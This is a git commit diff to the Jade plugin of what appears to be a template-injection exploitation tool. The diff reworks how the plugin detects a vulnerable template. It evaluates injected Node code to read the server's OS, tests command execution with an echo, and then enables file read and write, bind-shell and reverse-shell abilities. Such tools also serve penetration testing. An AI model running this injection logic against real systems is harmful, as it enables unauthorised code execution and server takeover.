c81408c5298fa8b8c9601d716bc11d6a102d2208
Emilio Pinna <emilio.pinn@gmail.com>
2016-10-17 14:03:31 +0300

    Fix Jade plugin for the new render detection

--- plugins/engines/jade.py
+++ plugins/engines/jade.py
@@ -14,7 +14,14 @@ class Jade(Plugin):
             'call': 'inject',
             'render': '\n= %(code)s\n',
             'header': '\n= %(header)s\n',
-            'trailer': '\n= %(trailer)s\n'
+            'trailer': '\n= %(trailer)s\n',
+            'render_test': """'%(s1)s'+'%(s2)s'""" % { 
+                's1' : rand.randstrings[0], 
+                's2' : rand.randstrings[1]
+            },
+            'render_expected': '%(res)s' % { 
+                'res' : rand.randstrings[0]+rand.randstrings[1] 
+            }
         },
         # No evaluate_blind here, since we've no sleep, we'll use inject
         'write' : {
@@ -86,29 +93,18 @@ class Jade(Plugin):
 
     def rendered_detected(self):
 
-        randA = rand.randstr_n(2)
+        os = self.evaluate("""global.process.mainModule.require('os').platform()""")
+        if os and re.search('^[\w-]+$', os):
+            self.set('os', os)
+            self.set('evaluate', self.language)
+            self.set('write', True)
+            self.set('read', True)
 
-        # Check this to avoid false positives
-        payload = 'p %s' % randA
-        expected = '<p>%s</p>' % randA
-
-        if expected == self.render(payload):
-
-            self.set('engine', self.plugin.lower())
-            self.set('language', self.language)
-
-            os = self.evaluate("""global.process.mainModule.require('os').platform()""")
-            if os and re.search('^[\w-]+$', os):
-                self.set('os', os)
-                self.set('evaluate', self.language)
-                self.set('write', True)
-                self.set('read', True)
-
-                expected_rand = str(rand.randint_n(2))
-                if expected_rand == self.execute('echo %s' % expected_rand):
-                    self.set('execute', True)
-                    self.set('bind_shell', True)
-                    self.set('reverse_shell', True)
+            expected_rand = str(rand.randint_n(2))
+            if expected_rand == self.execute('echo %s' % expected_rand):
+                self.set('execute', True)
+                self.set('bind_shell', True)
+                self.set('reverse_shell', True)
 
 
     def blind_detected(self):
